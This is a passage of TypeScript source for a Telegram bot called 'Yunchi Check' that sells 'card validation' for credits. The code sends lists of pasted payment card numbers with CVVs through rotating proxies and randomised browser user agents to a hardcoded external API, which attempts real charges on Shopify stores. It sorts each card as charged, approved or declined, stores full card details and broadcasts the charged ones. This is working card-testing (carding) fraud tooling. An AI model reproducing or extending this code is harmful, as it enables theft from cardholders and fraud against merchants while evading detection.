            if (!siteResult) {
              if (siteAttempt + 1 < MAX_SITE_ATTEMPTS) { await new Promise(r => setTimeout(r, 300 + Math.random() * 300)); continue; }
              continue;
            }

            if (siteResult.status === 'live' || siteResult.status === 'dead') {
              finalResult = siteResult;
              break;
            }

            finalResult = siteResult;
            if (siteAttempt + 1 < MAX_SITE_ATTEMPTS) {
              await new Promise(r => setTimeout(r, 300 + Math.random() * 300));
              continue;
            }
            break;
          }

          if (!finalResult) {
            finalResult = { status: 'unknown', message: 'All attempts failed', rawResponse: '', price: 0, priceStr: '$0.00', apiResponse: '' };
          }

          const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
          const status = finalResult.status;
          const apiMessage = finalResult.apiResponse || finalResult.message || "N/A";
          const sitePrice = finalResult.price > 0 ? finalResult.priceStr : (usedSite.price ? `$${Number(usedSite.price).toFixed(2)}` : 'Auto');

          let statusEmoji = "⚠️"; let statusLabel = "𝗨𝗡𝗞𝗡𝗢𝗪𝗡"; let creditCost = 0; let statusBanner = "⚠️";
          if (status === "live") { statusEmoji = "🟢"; statusLabel = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅"; creditCost = 2; statusBanner = "🟩🟩🟩 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🟩🟩🟩"; }
          else if (status === "dead") { statusEmoji = "<tg-emoji emoji-id=\"5974083768233760323\">✖️</tg-emoji>"; statusLabel = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"; creditCost = 1; statusBanner = "<tg-emoji emoji-id=\"5974083768233760323\">✖️</tg-emoji><tg-emoji emoji-id=\"5974083768233760323\">✖️</tg-emoji><tg-emoji emoji-id=\"5974083768233760323\">✖️</tg-emoji> 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 <tg-emoji emoji-id=\"5974083768233760323\">✖️</tg-emoji><tg-emoji emoji-id=\"5974083768233760323\">✖️</tg-emoji><tg-emoji emoji-id=\"5974083768233760323\">✖️</tg-emoji>"; }
          else { statusBanner = "🟧🟧🟧 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 🟧🟧🟧"; }

          // Deduct credits
          if (creditCost > 0) {
            const newCredits = shProfile.credits - creditCost;
            await supabase.from("profiles").update({ credits: newCredits, updated_at: new Date().toISOString() }).eq("user_id", shProfile.user_id);
            await supabase.from("card_checks").insert({ user_id: shProfile.user_id, card_details: cc, gateway: "shopify_charge", status: "completed", result: status === "live" ? "charged" : "dead" });
          } else {
            await supabase.from("card_checks").insert({ user_id: shProfile.user_id, card_details: cc, gateway: "shopify_charge", status: "completed", result: "unknown" });
          }

          // Send debug for non-dead results
          if (status !== 'dead' && TELEGRAM_BOT_TOKEN) {
            const debugMasked = cc.replace(/^(\d{6})(\d+)(\d{4})/, '$1******$3');
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: SHOPIFY_DEBUG_CHAT,
                text: `🔧 <b>SHOPIFY /sh DEBUG</b>\n\n📇 <b>Card:</b> <code>${debugMasked}</code>\n👤 <b>User:</b> ${shProfile.username || 'Unknown'}\n🌐 <b>Site:</b> <code>${usedSite.url}</code>\n📊 <b>Status:</b> ${status.toUpperCase()}\n💬 <b>Response:</b> ${String(apiMessage).substring(0, 300)}\n\n🕐 ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`,
                parse_mode: "HTML",
              }),
            }).catch(() => {});
          }

          // Notify charged card broadcast
          if (status === 'live' && SUPABASE_SERVICE_ROLE_KEY) {
            fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
              method: "POST",
              headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` },
              body: JSON.stringify({ user_id: shProfile.user_id, card_details: cc, status: 'CHARGED', response_message: apiMessage, amount: sitePrice, gateway: 'Shopify Charge' }),
            }).catch(() => {});
          }

          const newBalance = shProfile.credits - creditCost;
          const deadProxiesCount = failedProxyIds.length;
          const allProxiesDead = failedProxyIds.length >= userProxies.length;

          let resultMsg = `
🛍 <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>

${statusBanner}

<blockquote>📇 <b>BIN Info</b>
<i>${shBrandLogo} ・ ${escapeHtml(shBinType)} ・ ${escapeHtml(shBinLevel)}
🏦 ${escapeHtml(shBinBank)}
${shCountryFlag} ${escapeHtml(shBinCountry)}</i></blockquote>
📟 <code>${escapeHtml(cc)}</code>

${statusEmoji} <b>Result</b>
📊 <b>Status:</b> ${statusLabel}
💬 <b>Response:</b> <code>${escapeHtml(String(apiMessage).substring(0, 150))}</code>
💵 <b>Amount:</b> ${escapeHtml(sitePrice)}

<i>💰 <b>Account</b>
🔹 <b>Cost:</b> ${creditCost > 0 ? `-${creditCost} credits` : "Free (0 credits)"}
💳 <b>Balance:</b> ${newBalance} credits
⏱️ <b>Time:</b> ${elapsed}s</i>${deadProxiesCount > 0 ? `\n\n🔴 <b>${deadProxiesCount} dead proxy${deadProxiesCount > 1 ? 'ies' : ''} removed</b>` : ""}${allProxiesDead ? `\n⚠️ <b>All proxies dead!</b> Add new ones at yunchicheck.com` : ""}
`;

          const resultButtons: any[][] = [];
          if (status !== "live") {
            resultButtons.push([{ text: "🔄 𝗥𝗲𝘁𝗿𝘆 𝗦𝗮𝗺𝗲 𝗥𝗮𝗻𝗴𝗲", callback_data: `sh_price_${priceMin}_${priceMax}_${encodedCC}` }]);
          }
          resultButtons.push([{ text: "🔙 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu_back" }]);

          await editTelegramMessage(callbackChatId, messageId, resultMsg, { inline_keyboard: resultButtons });

        } catch (err) {
          const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
          const errMsg = err instanceof Error ? err.message : "Unknown error";
          await editTelegramMessage(callbackChatId, messageId, `
🛍 <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>

${shBrandLogo}
📟 <code>${escapeHtml(cc)}</code>
🏦 ${escapeHtml(shBinBank)}
${shCountryFlag} ${escapeHtml(shBinCountry)}

❌ <b>𝗘𝗿𝗿𝗼𝗿:</b> ${escapeHtml(errMsg)}
⏱️ ${elapsed}s
`, {
            inline_keyboard: [
              [{ text: "🔄 𝗥𝗲𝘁𝗿𝘆", callback_data: `sh_price_${priceMin}_${priceMax}_${encodedCC}` }],
              [{ text: "🔙 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu_back" }]
            ]
          });
        }

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // MULTI SHOPIFY CHARGE (/msh) PRICE GROUP CALLBACK
      // ─────────────────────────────────────────────────────────

      if (callbackData === "msh_nosite") {
        await answerCallbackQuery(update.callback_query.id, "❌ No sites available in this price range");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData.startsWith("msh_") && !callbackData.startsWith("msh_nosite")) {
        const mshParts = callbackData.replace("msh_", "").split("_");
        const mshPriceMin = parseInt(mshParts[0]);
        const mshPriceMax = parseInt(mshParts[1]);
        const mshBulkId = mshParts[2];

        // Fetch cards from DB
        const { data: bulkData } = await supabase.from("pending_bulk_checks").select("cards").eq("id", mshBulkId).maybeSingle();
        let mshCards: string[] = [];
        if (bulkData?.cards) { mshCards = bulkData.cards.split("\n").filter((c: string) => c.trim()); }
        // Delete immediately to prevent duplicate processing on re-click
        await supabase.from("pending_bulk_checks").delete().eq("id", mshBulkId);
        if (!mshCards.length) {
          await answerCallbackQuery(update.callback_query.id, "❌ Card data expired or invalid");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        if (!mshCards.length || !callbackChatId || !messageId) {
          await answerCallbackQuery(update.callback_query.id, "❌ Invalid request");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        await answerCallbackQuery(update.callback_query.id, `⚡ Checking ${mshCards.length} cards on $${mshPriceMin}-$${mshPriceMax}...`);

        const { data: mshProfile } = await supabase
          .from("profiles")
          .select("user_id, username, credits, is_banned")
          .eq("telegram_chat_id", callbackChatId)
          .maybeSingle();

        if (!mshProfile) {
          await editTelegramMessage(callbackChatId, messageId, `❌ <b>Account not found.</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        if (mshProfile.is_banned) {
          await editTelegramMessage(callbackChatId, messageId, `🚫 <b>Account Suspended</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        if (mshProfile.credits < mshCards.length) {
          await editTelegramMessage(callbackChatId, messageId, `❌ <b>Insufficient Credits</b>\n\nNeed at least <b>${mshCards.length}</b> credits. Balance: <b>${mshProfile.credits}</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Fetch sites
        let mshSitesQuery = supabase.from("gateway_urls").select("url, price").not("url", "like", "https://razorpay.me/%").lte("price", 100);
        if (mshPriceMin > 0) mshSitesQuery = mshSitesQuery.gt("price", mshPriceMin);
        if (mshPriceMax < 100) mshSitesQuery = mshSitesQuery.lte("price", mshPriceMax);
        else mshSitesQuery = mshSitesQuery.gt("price", 0);
        const { data: mshSites } = await mshSitesQuery.order("created_at", { ascending: false });

        if (!mshSites || mshSites.length === 0) {
          await editTelegramMessage(callbackChatId, messageId, `❌ <b>No sites available</b> in $${mshPriceMin}-$${mshPriceMax} range.`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Fetch proxies
        const { data: mshProxies } = await supabase.from("user_proxies").select("*").eq("user_id", mshProfile.user_id);
        if (!mshProxies || mshProxies.length < 1) {
          await editTelegramMessage(callbackChatId, messageId, `❌ <b>No Proxies</b>\n\nAdd proxies at yunchicheck.com/dashboard → Proxies`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const SHOPIFY_API_URL_MSH = "http://108.165.12.183:8081/";
        const MSH_DEBUG_CHAT = "-1003848532661";
        const MSH_UNKNOWN_RETRIES = 3;
        const mshStartTime = Date.now();

        const mshBadResponses = ["Site not supported", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "Payment method not available", "ARTIFACT_DISSATISFACTION", "VALIDATION_CUSTOM", '"Gateway":"Authorize.net"'];
        const mshProxyDeadIndicators = ["proxy dead", "proxy error", "proxy authentication", "connection refused", "proxy connect", "tunneling socket", "proxy_error", "bad proxy", "cannot connect to host", "socks", "econnrefused", "econnreset"];
        const mshSiteDeadIndicators = ["site dead"];
        const mshUserAgents = [
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
        ];

        const mshFormatProxy = (p: any) => p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;
        const mshFailedProxyIds: string[] = [];
        const mshAvailableSites = [...mshSites].sort(() => Math.random() - 0.5);

        // BIN lookup helper
        const mshLookupBin = async (cardNum: string) => {
          const bin = cardNum.replace(/\D/g, '').slice(0, 8);
          let bank = "Unknown", country = "", countryCode = "XX";
          try {
            const r = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { 'Accept-Version': '3' } });
            if (r.ok) { const d = await r.json(); bank = d.bank?.name || "Unknown"; country = d.country?.name || ""; countryCode = d.country?.alpha2 || "XX"; }
          } catch {}
          const getF = (code: string) => { if (!code || code === 'XX') return '🌍'; return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)); };
          return { bank, country, flag: getF(countryCode) };
        };

        // Single call helper
        const mshCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
          const apiUrl = `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 45000);
          try {
            const resp = await fetch(apiUrl, { method: "GET", headers: { 'Accept': 'application/json, text/plain, */*', 'User-Agent': mshUserAgents[Math.floor(Math.random() * mshUserAgents.length)], 'Cache-Control': 'no-cache' }, signal: controller.signal });
            clearTimeout(timeout);
            const rawText = await resp.text();
            if (!rawText || rawText.trim() === '') return { status: 'unknown', message: 'Empty', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
            const rawLower = rawText.toLowerCase();
            if (rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token'))
              return { status: 'unknown', message: 'Transient', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
            if (mshProxyDeadIndicators.some(ind => rawLower.includes(ind)))
              return { status: 'dead', message: 'Proxy Dead', price: 0, priceStr: '$0.00', proxyDead: true, siteDead: false, response: 'Proxy Dead' };
            if (mshSiteDeadIndicators.some(ind => rawLower.includes(ind)))
              return { status: 'dead', message: 'Site Dead', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: true, response: 'Site Dead' };
            if (mshBadResponses.some(bad => rawLower.includes(bad.toLowerCase())))
              return { status: 'dead', message: 'Bad response', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
            if (rawText.includes('DELIVERY_ADDRESS'))
              return { status: 'dead', message: 'DELIVERY_ADDRESS', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: 'DELIVERY_ADDRESS' };

            let price = 0, priceStr = '$0.00';
            const pricePatterns = [/\$[\d,]+\.?\d*/g, /"price":\s*"?[\d.]+/gi, /"amount":\s*"?[\d.]+/gi];
            for (const pattern of pricePatterns) { const matches = rawText.match(pattern); if (matches) { for (const m of matches) { const v = parseFloat(m.replace(/[^0-9.]/g, "")); if (!isNaN(v) && v > 0 && (v < price || price === 0)) { price = v; priceStr = `$${v.toFixed(2)}`; } } } }

            let apiStatus = 'unknown', apiMessage = rawText, apiResponse = '';
            try {
              const json = JSON.parse(rawText);
              if (json.Price > 0) { price = json.Price; priceStr = `$${Number(json.Price).toFixed(2)}`; }
              if (json.Response) apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
              apiMessage = json.message || json.msg || json.error || rawText;
              if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎')
                { apiStatus = 'live'; apiMessage = json.message || json.Response || 'Charged'; }
              else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' || json.status === 'OTP_REQUIRED' || json.Response === 'OTP_REQUIRED')
                { apiStatus = 'dead'; apiMessage = json.message || json.error || json.Response || 'Declined'; }
              else {
                const combined = ((apiMessage || '') + ' ' + (apiResponse || '')).toLowerCase();
                if (combined.includes('order_completed') || combined.includes('charged') || combined.includes('success') || combined.includes('approved')) apiStatus = 'live';
                else if (combined.includes('declined') || combined.includes('invalid') || combined.includes('expired') || combined.includes('insufficient') || combined.includes('card_declined') || combined.includes('do_not_honor') || combined.includes('fraud') || combined.includes('otp_required') || combined.includes('3ds') || combined.includes('rejected') || combined.includes('restricted') || combined.includes('generic_decline')) apiStatus = 'dead';
              }
            } catch {
              const lower = rawText.toLowerCase();
              if (lower.includes('order completed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) apiStatus = 'live';
              else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('otp_required') || lower.includes('rejected')) apiStatus = 'dead';
            }
            return { status: apiStatus, message: apiMessage, price, priceStr, proxyDead: false, siteDead: false, response: apiResponse };
          } catch (e) { clearTimeout(timeout); const msg = e instanceof Error ? e.message : 'Error'; return { status: 'unknown', message: msg.includes('abort') ? 'Timeout' : msg, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' }; }
        };

        // With retry
        const mshCallWithRetry = async (cardCC: string, siteUrl: string, proxy: string) => {
          let result = await mshCallOnce(cardCC, siteUrl, proxy);
          if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
          for (let retry = 1; retry <= MSH_UNKNOWN_RETRIES; retry++) {
            await new Promise(r => setTimeout(r, 800 * retry));
            result = await mshCallOnce(cardCC, siteUrl, proxy);
            if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
          }
          return result;
        };

        // Check a single card with site/proxy rotation
        const mshCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
          const shuffledProxies = [...mshProxies].filter(p => !mshFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
          if (shuffledProxies.length === 0) return { status: 'unknown', response: 'No proxies', price: '$0.00' };
          const maxSites = Math.min(2, mshAvailableSites.length);
          for (let si = 0; si < maxSites; si++) {
            const site = mshAvailableSites[si % mshAvailableSites.length];
            for (const proxy of shuffledProxies) {
              if (mshFailedProxyIds.includes(proxy.id)) continue;
              const result = await mshCallWithRetry(cardCC, site.url, mshFormatProxy(proxy));
              if (result.proxyDead) {
                mshFailedProxyIds.push(proxy.id);
                supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
                continue;
              }
              if (result.siteDead) {
                supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
                break;
              }
              if (result.status === 'live' || result.status === 'dead') {
                return { status: result.status, response: result.response || result.message || 'N/A', price: result.price > 0 ? result.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
              }
              return { status: 'unknown', response: result.response || result.message || 'Unknown', price: result.price > 0 ? result.priceStr : '$0.00' };
            }
          }
          return { status: 'unknown', response: 'All attempts failed', price: '$0.00' };
        };

        // Results array
        interface MshResult { cc: string; status: string; response: string; price: string; bank: string; flag: string; }
        const mshResults: MshResult[] = [];
        let mshCharged = 0, mshApproved = 0, mshDeclined = 0;
        let mshTotalCost = 0;

        // Build live update message
        const buildMshMessage = (checked: number, total: number, elapsed: string) => {
          let msg = `🛍 𝗠𝗨𝗟𝗧𝗜 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘 | ${checked}/${total} | ${elapsed}s\n\n`;
          const counters: string[] = [];
          if (mshCharged > 0) counters.push(`💎 ${mshCharged} Charged`);
          if (mshApproved > 0) counters.push(`✅ ${mshApproved} Approved`);
          if (mshDeclined > 0) counters.push(`❌ ${mshDeclined} Declined`);
          if (counters.length > 0) msg += counters.join('   ') + '\n';

          for (const r of mshResults) {
            let emoji = '⚠️';
            if (r.status === 'live') emoji = '💎';
            else if (r.status === 'dead') emoji = '❌';
            else emoji = '✅';

            msg += `\n${escapeHtml(r.cc)}\n`;
            msg += `${emoji} ${escapeHtml(r.response)} | ${escapeHtml(r.price)}\n`;
            msg += `<i>${escapeHtml(r.bank)} ${r.flag}</i>\n`;
          }

          return msg;
        };

        // Show initial processing message
        await editTelegramMessage(callbackChatId, messageId, `🛍 𝗠𝗨𝗟𝗧𝗜 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘 | 0/${mshCards.length} | 0.00s\n\n⏳ <i>Starting bulk check...</i>`);

        // Process cards one by one
        for (let i = 0; i < mshCards.length; i++) {
          const cardCC = mshCards[i].trim();
          if (!cardCC) continue;

          const cardParts = cardCC.split("|");
          if (cardParts.length < 4 || !cardParts[3] || cardParts[3].length < 3) {
            mshResults.push({ cc: cardCC, status: 'error', response: 'Invalid format', price: '$0.00', bank: 'N/A', flag: '🌍' });
            mshDeclined++;
            continue;
          }

          // BIN lookup
          const binInfo = await mshLookupBin(cardParts[0]);

          // Check card
          const result = await mshCheckCard(cardCC);

          // Classify
          let statusType: string;
          const respLower = (result.response || '').toLowerCase();
          if (result.status === 'live') {
            if (respLower.includes('order_completed') || respLower.includes('order completed')) { mshCharged++; statusType = 'live'; }
            else { mshApproved++; statusType = 'approved'; }
          } else if (result.status === 'dead') {
            mshDeclined++; statusType = 'dead';
          } else {
            // Check if it's a soft approval (3DS, OTP)
            if (respLower.includes('3ds') || respLower.includes('otp') || respLower.includes('required')) { mshApproved++; statusType = 'approved'; }
            else { mshDeclined++; statusType = 'dead'; }
          }

          // Credit deduction
          let cardCost = 0;
          if (result.status === 'live') cardCost = 2;
          else if (result.status === 'dead') cardCost = 1;
          mshTotalCost += cardCost;

          if (cardCost > 0) {
            await supabase.from("profiles").update({ credits: mshProfile.credits - mshTotalCost, updated_at: new Date().toISOString() }).eq("user_id", mshProfile.user_id);
            await supabase.from("card_checks").insert({ user_id: mshProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: result.status === "live" ? "charged" : "dead" });
          } else {
            await supabase.from("card_checks").insert({ user_id: mshProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: "unknown" });
          }

          // Notify charged
          if (result.status === 'live' && SUPABASE_SERVICE_ROLE_KEY) {
            fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
              method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` },
              body: JSON.stringify({ user_id: mshProfile.user_id, card_details: cardCC, status: 'CHARGED', response_message: result.response, amount: result.price, gateway: 'Shopify Charge' }),
            }).catch(() => {});
          }

          mshResults.push({
            cc: cardCC,
            status: statusType,
            response: result.response || 'N/A',
            price: result.price,
            bank: binInfo.bank,
            flag: binInfo.flag,
          });

          // Update message every card
          const elapsed = ((Date.now() - mshStartTime) / 1000).toFixed(2);
          try {
            await editTelegramMessage(callbackChatId, messageId, buildMshMessage(i + 1, mshCards.length, elapsed));
          } catch {}
        }

        // Final message
        const mshElapsed = ((Date.now() - mshStartTime) / 1000).toFixed(2);
        const mshNewBalance = mshProfile.credits - mshTotalCost;
        let finalMsg = buildMshMessage(mshCards.length, mshCards.length, mshElapsed);
        finalMsg += `\n✅ <b>Process Completed</b>\n`;
        finalMsg += `<i>💰 Cost: -${mshTotalCost} credits ・ Balance: ${mshNewBalance}</i>`;
        if (mshFailedProxyIds.length > 0) finalMsg += `\n🔴 <b>${mshFailedProxyIds.length} dead proxy removed</b>`;

        // Cards already cleaned up at start to prevent re-processing

        await editTelegramMessage(callbackChatId, messageId, finalMsg, {
          inline_keyboard: [[{ text: "🔙 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu_back" }]]
        });

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }


      
      if (callbackData === "user_mystatus") {
        const { data: profile } = await supabase
          .from("profiles")
          .select("user_id, username, name, credits, is_banned, ban_reason, banned_until, telegram_username, created_at")
          .eq("telegram_chat_id", callbackChatId)
          .maybeSingle();

        if (!profile) {
          await answerCallbackQuery(update.callback_query.id, "❌ Account not connected");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Fetch card check stats
        const { count: totalChecks } = await supabase.from("card_checks").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id);
        const { count: liveCards } = await supabase.from("card_checks").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id).eq("result", "live");
        const { count: deadCards } = await supabase.from("card_checks").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id).eq("result", "dead");
        const successRate = (totalChecks || 0) > 0 ? (((liveCards || 0) / (totalChecks || 1)) * 100).toFixed(1) : "0.0";

        let status = "✅ Active";
        if (profile.is_banned) {
          status = profile.banned_until 
            ? `🚫 Banned until ${new Date(profile.banned_until).toLocaleDateString()}`
            : "🚫 Permanently Banned";
        }

        const joined = new Date(profile.created_at).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" });

        const statusMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      📊 <b>MY STATUS</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>👤 Profile</b>
┌─────────────────────
│ Username: ${profile.username || "Not set"}
│ Name: ${profile.name || "Not set"}
│ Telegram: @${profile.telegram_username || "Not linked"}
└─────────────────────

<b>💳 Account</b>
┌─────────────────────
│ Credits: ${profile.credits || 0}
│ Status: ${status}
│ Member since: ${joined}
${profile.is_banned && profile.ban_reason ? `│ Reason: ${profile.ban_reason}` : ""}
└─────────────────────

<b>📊 Card Stats</b>
┌─────────────────────
│ Total Checks: ${totalChecks || 0}
│ ✅ Live Cards: ${liveCards || 0}
│ ❌ Dead Cards: ${deadCards || 0}
│ 📈 Success Rate: ${successRate}%
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━
`;

        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, statusMessage, {
            inline_keyboard: [[{ text: "🔙 Back to Menu", callback_data: "user_back_start" }]]
          });
        } else {
          await sendTelegramMessage(callbackChatId!, statusMessage, {
            inline_keyboard: [[{ text: "🔙 Back to Menu", callback_data: "user_back_start" }]]
          });
        }
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "user_balance") {
        const { data: profile } = await supabase
          .from("profiles")
          .select("username, credits")
          .eq("telegram_chat_id", callbackChatId)
          .maybeSingle();

        if (!profile) {
          await answerCallbackQuery(update.callback_query.id, "❌ Account not connected");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const balanceMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      💰 <b>MY BALANCE</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>💳 Credits Available</b>
┌─────────────────────
│
│      <b>${profile.credits || 0}</b> CREDITS
│
└─────────────────────

<b>📈 Quick Actions</b>
• Top up credits via dashboard
• Check usage history
• Set spending alerts

━━━━━━━━━━━━━━━━━━━━━━
`;

        const balanceKeyboard = {
          inline_keyboard: [
            [{ text: "💳 Top Up Credits", url: "https://yunchicheck.com/dashboard/topup" }],
            [{ text: "🔙 Back to Menu", callback_data: "user_back_start" }]
          ]
        };
        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, balanceMessage, balanceKeyboard);
        } else {
          await sendTelegramMessage(callbackChatId!, balanceMessage, balanceKeyboard);
        }
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "user_help") {
        const helpMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      ❓ <b>HELP CENTER</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>🔗 How to Connect Account</b>
┌─────────────────────
│ 1️⃣ Copy your Chat ID
│ 2️⃣ Go to yunchicheck.com
│ 3️⃣ Sign up / Login
│ 4️⃣ Paste in Profile settings
│ 5️⃣ Click verify & confirm here
└─────────────────────

<b>📋 Available Commands</b>
┌─────────────────────
│ /start - Main menu
│ /help - This help page
│ /mystatus - Account status
└─────────────────────

<b>🎫 Need Support?</b>
Open a ticket through the dashboard
for personalized assistance.

━━━━━━━━━━━━━━━━━━━━━━
`;

        const helpKeyboard = {
          inline_keyboard: [
            [{ text: "🌐 Open Dashboard", url: "https://yunchicheck.com/dashboard" }],
            [{ text: "🔙 Back to Menu", callback_data: "user_back_start" }]
          ]
        };
        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, helpMessage, helpKeyboard);
        } else {
          await sendTelegramMessage(callbackChatId!, helpMessage, helpKeyboard);
        }
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "user_copy_id") {
        await answerCallbackQuery(update.callback_query.id, `📋 Your Chat ID: ${callbackChatId}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "user_back_start") {
        // Check if user is connected
        const { data: profile } = await supabase
          .from("profiles")
          .select("username, credits, is_banned")
          .eq("telegram_chat_id", callbackChatId)
          .maybeSingle();

        const isAdminUser = await isAdminAsync(callbackChatId!, supabase);
        const isModUser = await isModeratorAsync(callbackChatId!, supabase);

        const welcomeMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      🎴 <b>YUNCHI CHECK</b>
━━━━━━━━━━━━━━━━━━━━━━

<i>Premium Card Validation Service</i>

${profile ? `
✅ <b>Account Connected</b>
┌─────────────────────
│ 👤 ${profile.username || "User"}
│ 💰 ${profile.credits || 0} Credits
│ ${profile.is_banned ? "🚫 Status: Banned" : "✨ Status: Active"}
└─────────────────────
` : `
📋 <b>Your Chat ID</b>
┌─────────────────────
│ <code>${callbackChatId}</code>
└─────────────────────

